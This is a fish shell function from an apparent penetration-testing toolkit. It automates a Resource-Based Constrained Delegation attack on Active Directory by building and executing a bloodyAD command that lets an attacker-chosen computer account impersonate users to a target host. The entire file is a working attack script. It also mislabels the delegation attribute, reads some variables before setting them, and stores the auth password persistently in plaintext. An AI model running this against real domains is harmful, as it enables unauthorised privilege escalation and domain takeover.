# description: RBCD attack (msDS-AllowedToDelegateTo)
function __kronos_rbcd --description "RBCD attack (msDS-AllowedToDelegateTo)"
    set -l wizard 0
    if test (count $argv) -eq 0
        set wizard 1
    end

    argparse t/target= h/help q/quiet u/username= p/password= k/kerberos target-computer= delegate-to= a/action= X/edit-cmd w/wizard -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos rbcd [OPTIONS]"
        echo ""
        echo "Perform Resource-Based Constrained Delegation attack using bloodyAD."
        echo ""
        echo "Options:"
        echo "  -t, --target IP         Target DC IP or Hostname"
        echo "  --target-computer NAME  The computer account being targeted (e.g. dc01\$)"
        echo "  --delegate-to NAME      The computer account allowed to delegate (e.g. evilcomp\$)"
        echo "  -a, --action ACTION      Action (add, remove) - default: add"
        echo "  -u, --username USER      Auth username"
        echo "  -p, --password PASS      Auth password"
        echo "  -k, --kerberos           Use Kerberos authentication"
        echo "  -X, --edit-cmd           Edit the command before execution"
        echo "  -q, --quiet              Skip prompts and use fallbacks"
        echo "  -h, --help               Show this help message"
        return 0
    end

    set -l target $_flag_target
    if test -z "$target"; set target $argv[1]; end
    set -l target_comp $_flag_target_computer
    set -l delegate_to $_flag_delegate_to
    set -l action $_flag_action
    set -l auth_user $_flag_username
    set -l auth_pass $_flag_password

    if not set -q _flag_quiet
        if test "$wizard" -eq 1 -o -z "$target"; or set -q _flag_wizard
            set_color cyan; echo "[*] Starting RBCD wizard..."; set_color normal

            set -l def_target "$__KRONOS_CACHE_RBCD_TARGET"
            set -l src_target "Cache"
            if test -z "$def_target"
                set def_target "$TGT"; set src_target "TGT"
                if test -z "$def_target"; set def_target "$TGT_DC_IP"; set src_target "TGT_DC_IP"; end
                if test -z "$def_target"; set def_target "$TGT_DC"; set src_target "TGT_DC"; end
                if test -z "$def_target"; set def_target "$TGT_HOSTS[1]"; set src_target "TGT_HOSTS"; end
            end
            if test -n "$target"; set def_target "$target"; set src_target "CLI Arg"; end
            set target (__kronos_ask "Target DC IP/Hostname" "$def_target" "$src_target"); or return 1
            set -U __KRONOS_CACHE_RBCD_TARGET "$target"

            set -l def_domain "$__KRONOS_CACHE_RBCD_DOMAIN"
            set -l src_domain "Cache"
            if test -z "$def_domain"
                set def_domain "$TGT_HOSTS[1]"; set src_domain "TGT_HOSTS"
                if test -z "$def_domain"; set def_domain "$TGT_DC_DOMAIN"; set src_domain "TGT_DC_DOMAIN"; end
            end
            if test -n "$domain"; set def_domain "$domain"; set src_domain "CLI Arg"; end
            set domain (__kronos_ask "Domain Name" "$def_domain" "$src_domain"); or return 1
            set -U __KRONOS_CACHE_RBCD_DOMAIN "$domain"

            set target_comp (__kronos_ask "Target Computer (e.g. web01\$)" "$target_comp"); or return 1
            set -U __KRONOS_CACHE_RBCD_TARGET_COMP "$target_comp"

            set delegate_to (__kronos_ask "Delegate to Computer (e.g. evil\$)" "$delegate_to"); or return 1
            set -U __KRONOS_CACHE_RBCD_DELEGATE "$delegate_to"

            set action (__kronos_ask_choice "Action" "$action" add remove); or return 1
            set -U __KRONOS_CACHE_RBCD_ACTION "$action"

            if not set -q _flag_kerberos
                set -l def_auth_user "$__KRONOS_CACHE_RBCD_AUTH_USER"
                set -l src_user "Cache"
                if test -z "$def_auth_user"
                    set def_auth_user "$TGT_USERNAME"; set src_user "TGT_USERNAME"
                end
                set auth_user (__kronos_ask "Auth Username" "$def_auth_user" "$src_user"); or return 1
                set -U __KRONOS_CACHE_RBCD_AUTH_USER "$auth_user"

                set -l def_auth_val "$__KRONOS_CACHE_RBCD_AUTH_VAL"
                set -l src_auth_val "Cache"
                if test -z "$def_auth_val"
                    set def_auth_val "$TGT_PASSWORD"; set src_auth_val "TGT_PASSWORD"
                    if test -z "$def_auth_val"; set def_auth_val "$TGT_CRED_PASSWORD"; set src_auth_val "TGT_CRED_PASSWORD"; end
                end
                if test -n "$auth_pass"; set def_auth_val "$auth_pass"; set src_auth_val "CLI Pass"; end
                if test -n "$auth_hash"; set def_auth_val "$auth_hash"; set src_auth_val "CLI Hash"; end
                set auth_pass (__kronos_ask "Auth Password" "$def_auth_val" "$src_auth_val"); or return 1
                set -U __KRONOS_CACHE_RBCD_AUTH_PASS "$auth_pass"
            end

            # Confirmation
            echo ""
            echo "Configuration:"
            echo "  Target DC: $target"
            echo "  Target Comp: $target_comp"
            echo "  Delegate To: $delegate_to"
            echo "  Action: $action"
            echo "  Auth:   "(set -q _flag_kerberos; and echo "Kerberos"; or echo "$auth_user")
            echo ""
            if test (__kronos_ask_confirm "Proceed with RBCD $action?" n) != "yes"
                echo "Aborted."
                return 1
            end
        end
    else
        # Fallbacks
        if test -z "$target"; set target "$__KRONOS_CACHE_RBCD_TARGET"; end
        if test -z "$target"; set target "$TGT"; end
        if test -z "$auth_user"; set auth_user "$TGT_USERNAME"; end
    end

    if test -z "$target"; echo "error: target is required"; return 1; end

    set -l domain $TGT_DC_DOMAIN
    if test -z "$domain"; set domain $TGT_HOSTS[1]; end
    if test -z "$domain"
        echo "error: \$TGT_DC_DOMAIN or \$TGT_HOSTS is not set" >&2
        return 1
    end

    set -l cmd_list bloodyAD --host "$target" -d "$domain"
    if set -q _flag_kerberos
        set -a cmd_list -k
    else
        set -a cmd_list -u "$auth_user" -p "$auth_pass"
    end

    set -a cmd_list $action rbcd "$target_comp" "$delegate_to"

    __kronos_check_dep bloodyAD; or return 1

    set -l cmd_str ""
    for part in $cmd_list
        set cmd_str "$cmd_str "(string escape -- $part)
    end
    set cmd_str (string trim $cmd_str)

    if set -q _flag_edit_cmd; set cmd_str (__kronos_edit_cmd "$cmd_str"); or return 1; end

    echo "[*] Performing RBCD $action on $target_comp via bloodyAD..."
    eval $cmd_str
end
